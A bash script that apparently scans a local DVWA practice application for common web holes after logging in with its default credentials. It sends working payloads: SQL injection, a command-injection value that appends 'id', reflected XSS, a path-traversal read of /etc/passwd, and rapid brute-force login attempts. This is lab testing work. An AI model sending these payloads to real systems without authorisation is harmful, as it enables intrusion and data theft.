#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${DVWA_BASE_URL:-http://localhost:4280}"
USER="${DVWA_USER:-admin}"
PASS="${DVWA_PASS:-password}"
COOKIE_FILE=".dvwa_cookies.txt"
TOKEN_FILE=".dvwa_token.txt"

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || { echo "[FAIL] missing command: $1"; exit 1; }
}

extract_token() {
  grep -oE "name='user_token' value='[^']+'" | sed -E "s/.*value='([^']+)'.*/\1/"
}

login() {
  need_cmd curl
  need_cmd grep
  need_cmd sed

  curl -sS -c "$COOKIE_FILE" "$BASE_URL/login.php" > /tmp/dvwa_login_page.html
  token=$(cat /tmp/dvwa_login_page.html | extract_token)
  if [[ -z "${token:-}" ]]; then
    echo "[FAIL] could not extract login CSRF token"
    exit 1
  fi

  curl -sS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/login.php" \
    --data-urlencode "username=$USER" \
    --data-urlencode "password=$PASS" \
    --data-urlencode "Login=Login" \
    --data-urlencode "user_token=$token" \
    > /tmp/dvwa_login_result.html

  if grep -qi "Login failed" /tmp/dvwa_login_result.html; then
    echo "[FAIL] login failed"
    exit 1
  fi

  echo "$token" > "$TOKEN_FILE"
  echo "[OK] login session prepared"
}

check_contains() {
  local name="$1"; shift
  local needle="$1"; shift
  local body
  body="$($@)"
  if grep -q "$needle" <<<"$body"; then
    echo "[WARN] $name appears vulnerable (matched: $needle)"
  else
    echo "[OK] $name did not match vulnerable indicator"
  fi
}

sqli() {
  check_contains "SQLi classic" "Surname" \
    curl -sS -b "$COOKIE_FILE" "$BASE_URL/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit"
}

sqli_blind() {
  local t1 t2
  t1=$(date +%s)
  curl -sS -b "$COOKIE_FILE" "$BASE_URL/vulnerabilities/sqli_blind/?id=1&Submit=Submit" >/dev/null
  t2=$(date +%s)
  echo "[INFO] blind SQLi baseline response time: $((t2-t1))s"
  echo "[WARN] manual timing payload comparison recommended for reliable result"
}

cmdi() {
  check_contains "Command Injection" "bytes from" \
    curl -sS -b "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/exec/" \
    --data-urlencode "ip=127.0.0.1;id" \
    --data-urlencode "Submit=Submit"
}

xss_r() {
  check_contains "Reflected XSS" "<script>alert(1)</script>" \
    curl -sS -b "$COOKIE_FILE" "$BASE_URL/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E"
}

lfi() {
  check_contains "File Inclusion" "root:x:" \
    curl -sS -b "$COOKIE_FILE" "$BASE_URL/vulnerabilities/fi/?page=../../../../../../etc/passwd"
}

brute() {
  local i
  for i in 1 2 3 4 5; do
    curl -sS -b "$COOKIE_FILE" "$BASE_URL/vulnerabilities/brute/?username=admin&password=wrong$i&Login=Login" >/dev/null
  done
  echo "[WARN] sent 5 rapid brute-force attempts; if no lockout/rate limit, issue likely present"
}

weak_id() {
  curl -sS -b "$COOKIE_FILE" "$BASE_URL/vulnerabilities/weak_id/" >/tmp/dvwa_weak_id.html
  echo "[INFO] review session/token behavior in browser devtools + response patterns"
}

full() {
  login
  sqli
  sqli_blind
  cmdi
  xss_r
  lfi
  brute
  weak_id
  echo "[INFO] manual remaining checks: stored XSS, CSRF, upload"
}

case "${1:-}" in
  login) login ;;
  sqli) sqli ;;
  sqli_blind) sqli_blind ;;
  cmdi) cmdi ;;
  xss_r) xss_r ;;
  lfi) lfi ;;
  brute) brute ;;
  weak_id) weak_id ;;
  full) full ;;
  *)
    echo "Usage: $0 {login|sqli|sqli_blind|cmdi|xss_r|lfi|brute|weak_id|full}"
    exit 1
    ;;
esac
